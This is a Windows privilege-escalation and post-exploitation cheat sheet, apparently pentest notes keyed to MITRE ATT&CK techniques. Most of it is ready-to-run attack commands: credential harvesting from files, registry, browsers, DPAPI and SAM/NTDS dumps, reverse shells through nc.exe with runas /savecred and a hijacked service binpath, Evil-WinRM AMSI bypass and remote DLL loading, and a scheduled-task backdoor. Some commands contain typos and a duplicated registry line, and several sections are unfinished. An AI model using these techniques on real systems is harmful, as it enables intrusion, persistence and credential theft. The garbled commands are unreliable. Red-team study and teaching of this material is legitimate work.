## Without Access

### From NMAP Serives

From application version, you can guess which version of Windows the system is running

- IIS Version: <https://en.wikipedia.org/wiki/Internet_Information_Services#History>

## With Access (Bash/)

### Initial Information Gathering

#### System information

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" # Displays O.S. Name and Version
hostname # Displays the hostname
driverquery # List of installed device drivers and their properties
wmic ntdomain get /all /format:List
wmic netclient get /all /format:List
nltest /trusted_domains
wmic pagefile
```

You can try to see if [wesng](https://github.com/bitsadmin/wesng) say something interesting.
Wesng is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities.

```bash
wes.py systeminfo.txt -p KB4487044 KB4477029 KB4480979
```

For more information about that technique refer to [T1082 - System Information Discovery](https://attack.mitre.org/techniques/T1082/)

#### Users information

```bash
net users # Enumerate the different users on the system
net user *user* # Display information about the given user
wmic useraccount get name,sid,fullname # Displays users using WMI
quser # Identify active user sessions on a computer.
wmic netlogin list /format:List # Display logon information
Get-WmiObject Win32_LoggedOnUser # Display logon users
klist sessions # Displays a list of logon sessions on this computer.
```

1) Check for recently run commands and recent documents

```bash
req query HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
req query HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

dir "C:\Users\USR\AppData\Local\Microsoft\Windows\FileHistory\Data"
```

2) Check if any user has the **passwordreq** flag set to **no**.

*[/passwordreq](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc771865(v=ws.11)?redirectedfrom=MSDN)* specifies whether a user account must have a password.

```bash
net user USER | findstr "required"
```

If it set to **no**, you could try to use the **/savecred** parameter of the **runas**.

This could be very interesting where it could be done an an account with administrator rights.

```bash
runas /user:Administrator /savecred "nc.exe -c cmd.exe IP PORT"
```

3) Check for the differents "User Shell Folders" configured

```bash
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```

For more information about that technique refer to [T1087.001 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)

#### Network information

```bash
arp -A # Displays the ARP (Address Resolution Protocol) cache table for all available interfaces.
netstat -ano
netsh firewall show state # Displays the Windows Firewall status
netsh firewall show config # Displays the Windows Firewall Configuration
route print # Displays the entries in the local IP routing table.
ipconfig /all # Displays the full TCP/IP configuration for all ntwork adapters.
nbtstat -n # Lists local NetBIOS names
nbtstat -s # Lists sessions table, converting destination IP addresses to their NETBIOS names.
net config workstation
netsh wlan show profile # List WLAN profile(s)
netsh wlan show profile WIFI_PROFILE key=clear # Get the Wi-Fi from a given profile
getmac # Display the MAC Addresses
```

For more information about that technique refer to [T1016 - System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)

#### Defense Enumeration

```bash
Get-MpPreference # Gets preferences for the Windows Defender scans and updates.
Get-AppLockerPolicyInfo # Gets the local, the effective, or a domain AppLocker policy.
```

#### Remote Desktop Session

Remote Desktop Services (RDS), known as **Terminal Services** in Windows Server 2008 and earlier, is one of the components of Microsoft Windows that allow a user to take control of a remote computer or virtual machine over a network connection.

```bash
qwinsta # Displays information about sessions on a Remote Desktop Session Host server.
```

Here below are the registry keys that control the settings of the Remote Desktop Protocol:

- **fDenyTSConnections**: Allows or denies connecting to Terminal Services.
- **fSingleSessionPerUser**: Each user can be limited to one session to save server resources or facilitate session recovery.
- **TSEnabled**: Indicates whether basic Terminal Services functions are enabled
- **TSUserEnabled** Indicates whether users can log on to the terminal server

```bash
# Allow the service within the Windows Firewall
netsh firewall set service type = remotedesktop mode = enable

# Enable Remote Desktop Protocol
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# Allow multiple sessions per user
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Start the service (Depends on the O.S. version)
net start termservice
net start "Terminal Services"
svchost.exe -k termsvcs
```

##### Saved RDP Connections

Information about all RDP connections is stored in the registry of each user.
It’s impossible to remove a computer (or computers) from the list of RDP connection history using built-in Windows tools.

```bash
reg query HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
reg query HKCU\Software\Microsoft\Terminal Server Client\Servers\
```

For more information about that technique refer to [T1021.001 - Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)

#### Credentials

##### Interesting Files Enumeration

```bash
c:\sysprep.inf # Could be clear-text credentials
c:\sysprep\sysprep.xml # Could be Base64 encoded credentials.
%WINDIR%\Panther\Unattend\Unattended.xml # Could be Base64 encoded credentials.
%WINDIR%\Panther\Unattended.xml # Could be Base64 encoded credentials.
dir profile.ps1 /s # May be executed by an adminitrator or can be used to persist
dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt  # Search for password in xml, ini and xml files
reg query HKLM /f password /t REG_SZ /s # Search for password in registry keys in HKLM
reg query HKCU /f password /t REG_SZ /s # Search for password in registry keys in HKCU
dir "C:\Users\USER\AppData\Local\Microsoft\Windows\INetCookies"
dir "C:\Users\USER\AppData\Roaming\Microsoft\Windows\Cookies"
dir "C:\Users\USER\AppData\Roaming\Microsoft\Windows\Cookies\Low"
```

If you can stage a .exe, you can use [Lazagne](https://github.com/AlessandroZ/LaZagne), which is even used by known APTs such as OilRig
The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer.

LaZagne can retreive password from the following software *groups*:

- Browsers: Firefox, Google Chrome, Opera, ...
- Mails: Outlook, Thunderbird, ...
- Chats: Pidgin, Psi and Skype
- Sysadmin: Apache Directory, FileZilla, OpenSSH, KeePass, WinSCP, ...
- Databases: DBVisualizer, Postgresql, Robomongo, Squirrel & SQLdevelopper, ...

&rarr; Would use it if it's seems to be a Dev/DBA/SysAdmin system or database server

- Games: GalconFusion, Kalypsomedia, RogueTale, Turba

&rarr; Would be surprising to find that on professional environment

- Git: Git for Windows

&rarr; Would use if the PC is a server or used by a member of the I.T. / Dev teams

- ...

```bash
# I would personaly not launch an "all" as it may be too intrusive
laZagne.exe all -oJ # Search for password within Browsers, Chats, Databases, Sysadmin tools, Git ...
laZagne.exe browsers -oJ # Search for password within Browsers
```

##### Data Protection API

Used by Windows to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy.

DPAPI allows developers to encrypt keys using a symmetric key derived from the **user's logon secrets**

1) Master key

The DPAPI keys used for encrypting the user's RSA keys are stored under *%APPDATA%\Microsoft\Protect\{SID}* directory, where *{SID}* is the Security Identifier of that user.

```bash
dir C:\Users\USER\AppData\Roaming\Microsoft\Protect\
dir C:\Users\USER\AppData\Local\Microsoft\Protect\
```

We can also use mimikatz *dpapi::masterkey* with either */pvk* or */rpc*

2) Credentials files

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

We can also use mimikatz *dpapi::cred* with the appropriate */masterkey*

##### Remote Desktop Credential Manager

```bash
dir %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

We can also use mimikatz *dpapi::rdg* with the appropriate */masterkey*

##### Memory Files

- **hiberfil.sys**: RAM stored during machine hibernation
- **%SystemDrive%\pagefile.sys**: Virtual memory used by Windows
- **%SystemDrive%\swapfile.sys**: Virtual memory used by Windows Store Apps

For more information about those techniques refer to:

- [T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [T1552.002 - Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002/)
- [T1546.013 - Event Triggered Execution: PowerShell Profile](https://attack.mitre.org/techniques/T1546/013/)

###### *If you don't know, now you know : [Windows Setup Automation](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-installation-process)*

Windows Setup is the program that installs Windows or upgrades an existing Windows installation. It is also the basis for the following installation and upgrade methods:

- Interactive Setup
- Automated installation
- Windows Deployment Services

What interest us is the *Automated installation*.

When you use *Automated installation*, you can either use:

- Setupconfig.ini to install Windows
- An *answer file* while installing Windows

![Use an answer file while installing Windows](servicing_unattend.png)

Because answer files are cached to the computer during Windows Setup, **your answer files will persist on the computer between reboots**.

Before you deliver the computer to a customer, you must delete the cached answer file in the **%WINDIR%\panther** directory. There might be potential security issues if you include domain passwords, product keys, or other sensitive data in your answer file.

#### Windows Remote Management

WinRM is Microsoft's implementation of WS-Management in Windows which allows systems to access or exchange management information across a common network.

If you find a user, try also to use WinRM

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate.
[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) remote shell/that lets you execute processes on remote windows systems

Usage:

- **--scripts**: Powershell scripts local path
- **--executables**: C# executables local path
- **--hash**: NTHash

```bash
evil-winrm -i IP -u USERNAME -p PASSWORD --scripts PS_SCRIPTS_PATH --executables EXES_PATH
\*Evil-WinRM\* PS >upload /root/files/                       # Upload a file (Relative paths are not allowed to use on download/upload.)
\*Evil-WinRM\* PS >download file                             # Download file (Relative paths are not allowed to use on download/upload.)
\*Evil-WinRM\* PS >services                                  # List all services showing if there your account has permissions over each one.
\*Evil-WinRM\* PS >PowerView.ps1                             # Executes PowerView.ps1
\*Evil-WinRM\* PS >menu                                      # Displays loaded functions from the PowerShell script executed

# Advanced commands
\*Evil-WinRM\* PS >Invoke-Binary /opt/file.exe               # Allows exes compiled from c# to be executed in memory.
\*Evil-WinRM\* PS >Dll-Loader -http -path http://IP/File.dll # Allows loading dll libraries in memory
\*Evil-WinRM\* PS >Bypass-4MSI                               # Patchs AMSI protection
```

```bash
python psexec.py USERNAME@PASSWORD
```

```bash
cme winrm IP -u USERNAME -p PASSWORD
```

For more information about that technique refer to [T1021.006 - Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/)

#### Process Enumeration

```bash
tasklist # Batch: Display processes currently running.
Get-Process # PowerShell: Display processes currently running.
```

For more information about that technique refer to [T1057 - Process Discovery](https://attack.mitre.org/techniques/T1057/)

#### Password Manager

##### KeePass

```bash
# Detects from where keepass is running
Get-WmiObject win32_process | Where-Object {$_.Name -like '*kee*'} | Select-Object -Expand ExecutablePath
# Searchs where is the binary and the database(s)
Get-ChildItem -Path C:\Users\ -Include @("*kee*.exe", "*.kdb*") -Recurse -ErrorAction SilentlyContinue | Select-Object -Expand FullName | fl
# (Possible) Retreive the KeePass.config.xml
Get-ChildItem -Path C:\Users\ -Include @("KeePass.config.xml") -Recurse -ErrorAction SilentlyContinue | Select-Object -Expand FullName | fl
```

If the version is 2.28, 2.29, or 2.30, we can use [KeeFarce](https://github.com/denandz/KeeFarce) which allows for the extraction of KeePass 2.x password database information from memory.

More in-depth information can be found here: <http://www.harmj0y.net/blog/redteaming/a-case-study-in-attacking-keepass/>

For more information about that technique refer to [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)

#### Web Browsers

Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.

For more information about that technique refer to [T1555.003 - Credentials from Password Stores: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)

https://github.com/djhohnstein/SharpWeb

##### Firefox

You could find some interersting files by reading the Firefox memory

```bash
procdump64.exe -accepteula -ma PID
cmd /c "strings64.exe -accepteula firefox.exe.dmp > firefox.exe.txt"
```

[Firefox Decrypt](https://github.com/Unode/firefox_decrypt) is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and some derivates.

It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.

This tool does not try to crack or brute-force the Master Password in any way. If the Master Password is not known it will simply fail to recover any data.

> %LocalAppData%\Mozilla\Firefox\Profiles\randomString.Default\logins.json

```bash
firefox_decrypt.py file.ini --list
```

##### Google Chrome

Chrome utilizes a Windows function called **CryptProtectData** to encrypt passwords stored on computers with a randomly generated key. Only a user with the same login credential as the user who encrypted the data can later decrypt the passwords. Every password is encrypted with a different random key and stored in a small database on the computer. The database can be found in the below directory.

> %LocalAppData%\Google\Chrome\User Data\Default\Login Data

For more information about that technique refer to [T1555.003 - Credentials from Password Stores: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)

#### Group Policy Preference Exploitation

Please note that this has been partially fixed within MS14-025

<https://adsecurity.org/?p=2288>

**SYSVOL** is the domain-wide share in Active Directory to which all authenticated users have read access.
SYSVOL contains logon scripts, group policy data, and other domain-wide data which needs to be available anywhere there is a Domain Controller (since SYSVOL is automatically synchronized and shared among all Domain Controllers).

Groups.xml file which is stored in SYSVOL
The password in the xml file is "obscured" from the casual user by encrypting it with AES, I say obscured because the static key is published on the msdn website allowing for easy decryption of the stored value.

```bash
Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
$DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')
```

Source: <https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1>

In addition to Groups.xml several other policy preference files can have the optional "cPassword" attribute set:
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes

We can use [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) which is part of PowerSploit in order to do the job for us

#### Network Enumeration

```bash
ipconfig /all
route print
arp -A # Display the ARP (Address Resolution Protocol) cache table for all available interfaces.
netstat -ano # Display all active connections
netsh firewall show state # Display the Windows Firewall status
netsh firewall show config # Display the Windows Firewall configuration
```

For more information about that technique refer to [T1016 - System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)

#### Windows Patches

Please note that it is not easy to find vulnerabilities with the output we receive from the query below.
KB Number depends on OS version and Service Pack, which make it difficult to directly map missing pack to known vulnerabilities.
However, if the "InstalledOn" column don't show patches that are "only" a few months old, this can be juicy.

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn # Get Installed patches
```

#### Privilege Abuse

```bash
whoami # Displays the current domain and user name.
whoami /all # Displays all information in the current access token, including the current user name, security identifiers (SID), privileges, and groups that the current user belongs to.
```

Check for the following access tokens

> / / / To Finish

|Privilege|Impact|Tool|Notes|
|-|-|-|-|
|SeAssignPrimaryToken|Admin|3rd party tool| Exploit either<br /> - rottenpotato.exe <br /> - juicypotato.exe|
|SeBackup|Threat|CLI|Read sensitve files|
|SeCreateToken|Admin|3rd party tool|
|SeDebug|Admin|PowerShell|<https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1>|
|SeLoadDriver|AdminR||
|SeRestore|Admin||
|SeTakeOwnership|Admin||
|SeTcb|Admin||

- SeAssignPrimaryTokenPrivilege
- SeBackupPrivilege:
  - reg save HKLM\SAM sam.hive
  - reg save HKLM\SYSTEM system.hive
  - reg save hklm\security security.hive

  &#8594; mimikatz
- SeImpersonatePrivilege
- SeLoadDriverPrivilege
- SeBackupPrivilege & SeRestorePrivilege:

  You can get yourself admin right of anyfolder

  ```powershell
  $user = "AD\Compromised User"
  $folder = "C:\InterestingFolder"
  $acl = Get-Acl $Folder
  $aclperms = $user,"FullControl","ContainerInherit,ObjectInherit","None","Allow"
  $aclrule = New-Object System.Security.AccessControl.FileSystemAccessRule $aclperms
  $acl.AddAccessRule($aclrule)
  Set-Acl -Path $Folder -AclObject $acl
  Get-Acl "C:\InterestingFolder" | fl
  ```

- SeRestorePrivilege: Modify a service that can be started by anyone and

Members of the "Backup Operators" can logon locally on a Domain Controller and backup the NTDS.DIT
For Instance:

```bash
wbadmin start backup -backuptarget:*e* -include:c:\windows\ntds
wbadmin get versions
wbadmin start recovery -version:*version* -recoverytarget:c:\temp\srvdc1 -notrestoreacl
```

or diskshadow: <https://youtu.be/ur2HPyuQlEU?t=1121>

For more information on those techniques:

- [T1003.002 - OS Credential Dumping: Security Account Manager](https://attack.mitre.org/techniques/T1003/002/)

#### AlwaysInstallElevated

AlwaysInstallElevated allows that any user can install .msi files as **NT AUTHORITY\SYSTEM**
You can check if it's enabled by checking both those registry keys

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

You can then create a malicious msi binary and execute it.

<https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated>

### Scheduled Tasks Enumeration

Check if you have write access to "C:\Windows\system32\Tasks"

> / / / To Finish

```bash
schtasks /query /fo LIST /v
```

Here are interesting schedule time for persistence:

- ONSTART: Specifies that the task runs every time the system starts. You can specify a start date, or run the task the next time the system starts.
- ONLOGON: Specifies that the task runs whenever a user (any user) logs on. You can specify a date, or run the task the next time the user logs on.
- ONIDLE: Specifies that the task runs whenever the system is idle for a specified period of time. You can specify a date, or run the task the next time the system is idle.

[SharPersist](https://github.com/fireeye/SharPersist) can be used to try to perform a Scheduled Task Backdoor

```bash
# Scheduled Task Backdoor
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```

For more information about that technique refer to [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)

### Service Enumeration

|N°| Commands      | Description |
|-|---------- | ----------- |
|1| wmic service get pathname,startname|Displays all service and user name.|
|2| wmic service get name,displayname,pathname,startmode \|findstr /i "auto" \|findstr /i /v "c:\windows\\\\" \|findstr /i /v """|Search for "Unquoted Service Path" vulnerable services
|3| sc sdshow *service*|Display the security descriptor of a given service|

If there is are path that contains whitespace and run as *LocalSystem*, Unquoted Service Path vulnerability.
When Windows starts a service, it looks for the PATH where that services is locating. If any unquoted (has space) in the PATH the service can be manipulating.
Here below is an example of a Windows Service that is vulnerable:

![Unquoted Path example](Unquoted_Example.PNG)
NIHardwareService is vulnerable as:

- *C:\Program Files\Common Files\Native Instruments\Hardware\NIHardwareService.exe* contain a whitespace and is not quoted
- The service has an *AUTO_START* start type
- The service is runnig whith high privilege, *LocalSystem*

If there are services that haves the **RP** permission for Authenticated Users **AU** ....

We can also use the Sysinternals tool [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) in order to check which service(s) may be vulnerable.

```bash
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -ucqv SERVICE_NAME
```

```bash
sc qc SERVICE_NAME
sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
```

For more information about that technique refer to:

- [T1007 - System Service Discovery](https://attack.mitre.org/techniques/T1007/)
- [T1543.003 - Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)

###### *If you don't know, now you know : [Service Security and Access Rights](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)*

- SERVICE_CHANGE_CONFIG: We can configure an arbitrary executable to launch when a service starts
- WRITE_DAC: We can modify the permissions on a service to grant ourself SERVICE_CHANGE_CONFIG access.
- WRITE_OWNER: We can become owner of it
- GENERIC_WRITE: It inherits the SERVICE_CHANGE_CONFIG permissions
- GENERIC_ALL: It inherits the SERVICE_CHANGE_CONFIG permissions

###### *If you don't know, now you know : [Service Accounts](https://docs.microsoft.com/en-us/windows/win32/services/service-user-accounts)*

- The **[NT AUTHORITY\LocalService](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account)** account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and presents anonymous credentials on the network.
Here are the service permissions this account has:
  - READ_CONTROL
  - SERVICE_ENUMERATE_DEPENDENTS
  - SERVICE_INTERROGATE
  - SERVICE_QUERY_CONFIG
  - SERVICE_QUERY_STATUS
  - SERVICE_USER_DEFINED_CONTROL

- The **[NetworkService](https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account)** account is a predefined local account used by the service control manager. It has minimum privileges on the local computer and acts as the computer on the network. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers.
This account has the same permissions as LocalService.

- The **[LocalSystem account](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account)** is a predefined local account used by the service control manager. It has extensive privileges on the local computer, Local System acts as the machine account on the network. Its token includes the **NT AUTHORITY\SYSTEM** and **BUILTIN\Administrators** SIDs; these accounts have access to most system objects. The name of the account in all locales is .\LocalSystem. The name, LocalSystem or ComputerName\LocalSystem can also be used. Localsystem is the most privileged account in a system, it's the only account that is able to access the security database (HKLM\Security).
Here are the additional service permissions this account has compared to LocalService:
  - SERVICE_PAUSE_CONTINUE
  - SERVICE_START
  - SERVICE_STOP
  - SERVICE_USER_DEFINED_CONTROL

###### *If you don't know, now you know : [Privileges](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment)*

A **privilege** is the right of an account, such as a user or group account, to perform various system-related operations on the local computer, such as shutting down the system, loading device drivers, or changing the system time.

Privileges can be managed through the "User Right Assignment" which provides an overview and links to information about the User Rights Assignment security policy settings user rights that are available in Windows.

Some privileges are available only in high integrity level process

Here are some juicy tokens to look for:

- [SeAssignPrimaryTokenPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/replace-a-process-level-token): Replace a process level token
- [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs): Allows the user to attach a debugger to any process.
The SeDebugPrivilege has the capability of reading and writing memory, as well as change properties of **any** processes (including Local Sytem or Administrator)
The SeDebugPrivilege has been created in order to give the possibility to perform privileged tasks with API calls like:
  - VirtualAlloc()
  - WriteProcessMemory()
  - CreateRemoteThread()
  - UpdateProcThreadAttribute(): You can perform ParentID Spofing using this attribute
- [SeBackup](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories): Back up files and directories.
- [SeCreateToken](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-a-token-object): Create a token object.
- [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication): Impersonate a client after authentication
- [SeRestorePrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories): Allows a user to circumvent file and directory permissions when restoring backed-up files and directories.
Here are some API calls available with this privilege:
  - CreateFile()
  - RegCreateKeyEx(): For instance change parameter of a Windows service that can be started by everybody
- [SeTakeOwnership](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects): Allows the user to take ownership of any securable object in the system.
Here are some API calls available with this privilege:
  - [SetSecurityInfo](https://docs.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfo): Sets specified security information in the security descriptor of a specified object.
  - [SetNamedSecurityInfo](https://docs.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setnamedsecurityinfoa): Sets specified security information in the security descriptor of a specified object. The caller identifies the object by name.
  Both those API can be used with the following types of objects:
    - Local or remote files or directories on an NTFS
    - Local or remote Windows services
    - Network shares
    - Registry keys
    - ...
- [SeTcbPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system): The SeTcbPrivilege policy setting determines whether a process can assume the identity of any user and thereby gain access to the resources that the user is authorized to access. Typically, only low-level authentication services require this user right.

Those accounts have special privileges:

- Administrators &#8594; Have **most** of the privileges
- Some built-in groups (Backup, Server, Printer Operators) &#8594; For instance Backup service have **SeBackup** and **SeRestorePrivilege** privileges
- Local/network service accounts
- Managed Service and Virtual Accounts
- Third party application users
- Misconfigured users

###### *If you don't know, now you know : [Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)*

A Token contains interesting things like:

- A list of privileges held by either the user or the user's groups.
- The token type:
  - Primary: An access token that is typically created only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.
  - Impersonation: An access token using different security information than the process that owns the thread.
- The current [impersonation level](https://docs.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels):
  - SecurityAnonymous (Not Used for PrivEsc): The driver cannot impersonate or identify the client.
  - SecurityIdentification (Not Used for PrivEsc): The driver can obtain the identity and privileges of the client but cannot impersonate the client.
  - SecurityImpersonation: The driver **can impersonate the client's security context on the local system**.
  - SecurityDelegation:The driver **can impersonate the client's security context on remote systems.**

![Access Token Schema](accesstoken.png)

Once an access token is created, you **cannot** changes his privileges, but you **can** enable or disable privileges.

You can also change the token type.

###### *If you don't know, now you know : [Security Descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors)*

Security descriptors define the security attributes of securable objects such as files, registry keys, WMI namespaces, printers, services, or shares.

A security descriptor contains information about the owner and primary group of an object. A provider can compare the resource security descriptor to the identity of a requesting user, and determine whether or not the user has the right to access the resource that a user is requesting.

A security descriptor can include the following security information:

- Security identifiers (SIDs) for the owner and primary group of an object.
- A DACL that specifies the access rights allowed or denied to particular users or groups.
- A SACL that specifies the types of access attempts that generate audit records for the object.
- A set of control bits that qualify the meaning of a security descriptor or its individual members.

![Security Descriptor](security-descriptor.png)

###### *If you don't know, now you know: [DACLs & ACEs](https://www.windowstechno.com/what-is-ntds-dit/)*

How it works

- No DACL &rarr; Full Access for everyone
- DACL defined &rarr; Access allowed by the ACEs within that DACLs

All ACEs contain the following access control information:

- A security identifier (SID) that identifies the trustee to which the ACE applies.
- An access mask that specifies the access rights controlled by the ACE.
- A flag that indicates the type of ACE.
- A set of bit flags that determine whether child containers or objects can inherit the ACE from the primary object to which the ACL is attached.

#### Autostarts

##### Autoruns

```bash
autorunsc.exe -a | findstr /n /R "File\ not\ found"

reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

Note that on 64-bit Windows, portions of the registry entries are stored separately for 32-bit application and 64-bit applications and mapped into separate logical registry views using the registry redirector and registry reflection, because the 64-bit version of an application may use different registry keys and values than the 32-bit version.

So if it is a Windows 64-bit, it is worst checking those registry keys

```bash
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\SOFTWARE\Wow6432Node\\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKEY_CURRENT_USER\SOFTWARE\Wow6432Node\\Microsoft\Windows\CurrentVersion\RunOnce
```

We can try to replace some of their .exe

For more information about that technique refer to [T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)

##### Windows StartUp folder

Placing a program within a startup folder will also cause that program to execute when a user logs in.
There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.

C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

In order to checks access, we can use [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)

```bash
icacls C:\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Check the last leter within the parantheses which is interpretted as the following:

- **D**: Delete access
- **F**: Full access (Edit_Permissions+Create+Delete+Read+Write)
- **N**: No access
- **M**: Modify access (Create+Delete+Read+Write)
- **RX**: Read and eXecute access
- **R**: Read-only access
- **W**: Write-only access

For more information about that technique refer to [T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)

#### DLL hijacking

DLL hijacking is an attack involves a  DLL taking over from a legitimate DLL.
Here are the variations:

- DLL replacement: replace a legitimate DLL with an evil DLL.
- DLL search order hijacking: DLLs specified by an application without a path are searched for in fixed locations in a specific order
- Phantom DLL hijacking: drop an evil DLL in place of a missing/non-existing DLL that a legitimate application tries to load
- DLL redirection: change the location in which the DLL is searched for, e.g. by editing the %PATH% environment variable, or .exe.manifest / .exe.local files to include the folder containing the evil DLL
- WinSxS DLL replacement: replace the legitimate DLL with the evil DLL in the relevant WinSxS folder of the targeted DLL.
- Relative path DLL Hijacking: copy (and optionally rename) the legitimate application to a user-writeable folder, alongside the evil DLL.

#### DLL search order hijacking

Microsoft once mentionned the following
>“When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order.
